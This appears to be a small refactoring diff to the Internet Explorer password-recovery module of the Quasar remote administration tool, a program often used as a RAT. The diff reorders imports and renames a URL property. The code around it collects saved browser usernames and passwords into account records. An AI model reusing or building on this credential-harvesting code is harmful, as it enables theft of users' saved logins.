@@ -1,4 +1,6 @@
-﻿using System;
+﻿using Microsoft.Win32;
+using Quasar.Common.Models;
+using System;
 using System.Collections;
 using System.Collections.Generic;
 using System.ComponentModel;
@@ -7,8 +9,6 @@ using System.Linq;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Text;
-using Microsoft.Win32;
-using xClient.Core.Data;
 using xClient.Core.Helper;
 
 namespace xClient.Core.Recovery.Browsers
@@ -34,7 +34,7 @@ namespace xClient.Core.Recovery.Browsers
                             {
                                 foreach (string[] loginInfo in dataList)
                                 {
-                                    data.Add(new RecoveredAccount() { Username = loginInfo[0], Password = loginInfo[1], URL = item.UrlString, Application = "InternetExplorer" });
+                                    data.Add(new RecoveredAccount() { Username = loginInfo[0], Password = loginInfo[1], Url = item.UrlString, Application = "InternetExplorer" });
                                 }
                             }
                         }
